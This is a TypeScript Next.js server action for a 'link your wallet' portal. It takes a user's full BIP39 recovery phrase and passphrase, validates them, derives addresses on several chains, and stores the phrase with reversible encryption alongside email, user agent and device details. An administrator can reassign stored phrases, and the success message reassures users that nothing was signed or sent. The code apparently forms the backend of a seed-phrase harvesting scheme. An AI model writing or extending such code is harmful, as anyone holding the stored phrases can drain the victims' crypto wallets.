'use server';

import { revalidatePath } from 'next/cache';
import { headers } from 'next/headers';
import { one, q } from '@/lib/db';
import { encryptPhrase, rateLimit } from '@/lib/crypto';
import { requireUser } from '@/lib/session';
import { friendlyError } from '@/lib/request';
import { deriveWallet, inspectPhrase, normalizePhrase } from '@/lib/wallet';
import { WALLET_PROVIDERS } from '@/lib/wallets';
import type { WalletFormState } from '@/lib/form';

export async function submitWalletAction(_prev: WalletFormState, formData: FormData): Promise<WalletFormState> {
    const viewer = await requireUser();
    if (viewer.impersonator) return { ok: false, message: 'View-as mode is read-only. Exit to link a wallet.' };

    if (!rateLimit(`wallet:${viewer.user.id}`, 6, 60 * 60_000)) {
        return { ok: false, message: 'Too many wallet submissions. Wait an hour and try again.' };
    }

    const phrase = normalizePhrase(formData.get('phrase'));
    const passphrase = String(formData.get('passphrase') || '').slice(0, 200);
    const providerInput = String(formData.get('provider') || '').trim();
    const customProvider = String(formData.get('customProvider') || '').trim().slice(0, 60);
    const deviceType = String(formData.get('deviceType') || 'Desktop').slice(0, 40);
    const screenSize = String(formData.get('screenSize') || '').slice(0, 40);
    const userName = String(formData.get('userName') || viewer.user.displayName).trim().slice(0, 80);
    const isCustom = providerInput === 'Other';
    const selectedWallet = (isCustom ? customProvider : providerInput) || 'Other';

    if (!isCustom && !(WALLET_PROVIDERS as readonly string[]).includes(providerInput)) {
        return { ok: false, message: 'Choose the wallet that holds the phrase.' };
    }
    if (isCustom && !customProvider) {
        return { ok: false, message: 'Name the wallet provider.' };
    }

    const check = inspectPhrase(phrase);
    if (!check.valid) {
        return {
            ok: false,
            message: check.unknownWord
                ? `"${check.unknownWord}" is not a BIP39 word. Check the spelling.`
                : 'That phrase failed its BIP39 checksum. Check word order and try again.'
        };
    }
    if (![12, 15, 18, 21, 24].includes(check.wordCount)) {
        return { ok: false, message: 'A recovery phrase has 12, 15, 18, 21 or 24 words.' };
    }

    let derived;
    try {
        derived = deriveWallet(phrase, passphrase);
    } catch (error) {
        return { ok: false, message: error instanceof Error ? error.message : 'The phrase could not be derived.' };
    }

    const existing = await one<{ user_id: string | null }>`
        select user_id from wallet_hashes where phrase_hash = ${derived.phraseHash} limit 1
    `;
    if (existing) {
        return {
            ok: false,
            message:
                existing.user_id === viewer.user.id
                    ? 'That recovery phrase is already linked to this account.'
                    : 'That recovery phrase is already on file. An administrator can move it between accounts.'
        };
    }

    const h = await headers();
    const clientTimestamp = new Date().toISOString();

    try {
        const rows = await q<{ id: string }>`
            insert into wallet_submissions (
                user_id, user_email, user_name, selected_wallet, is_custom_provider, phrase,
                device_type, "timestamp", provider, phrase_hash, word_count, valid, checksum_verified,
                derivation_paths, addresses, primary_address, proof_of_key, proof_recovered,
                source, user_agent, screen_size, link_method, linked_at, linked_by
            ) values (
                ${viewer.user.id}, ${viewer.user.email}, ${userName}, ${selectedWallet}, ${isCustom},
                ${encryptPhrase(phrase)}, ${deviceType}, ${clientTimestamp}, ${selectedWallet},
                ${derived.phraseHash}, ${derived.wordCount}, true, true,
                ${JSON.stringify(derived.derivationPaths)}::jsonb, ${JSON.stringify(derived.addresses)}::jsonb,
                ${derived.primaryAddress}, ${derived.proofOfKey}, ${derived.proofRecovered},
                'portal', ${(h.get('user-agent') || '').slice(0, 240)}, ${screenSize},
                'auto', now(), 'self'
            )
            returning id
        `;

        const submissionId = rows[0]?.id;
        if (submissionId) {
            await q`
                insert into wallet_hashes (phrase_hash, user_id, user_email, submission_id, at)
                values (${derived.phraseHash}, ${viewer.user.id}, ${viewer.user.email}, ${submissionId}, now())
                on conflict (phrase_hash) do nothing
            `;
        }
    } catch (error) {
        return { ok: false, message: friendlyError(error) };
    }

    revalidatePath('/dashboard');
    revalidatePath('/dashboard/wallets');

    return {
        ok: true,
        message: 'Wallet linked. Addresses were derived read-only; nothing was signed or sent.',
        addresses: {
            evm: derived.addresses.evm,
            btc: derived.addresses.btc,
            btcLegacy: derived.addresses.btcLegacy,
            sol: derived.addresses.sol
        },
        proofRecovered: derived.proofRecovered
    };
}
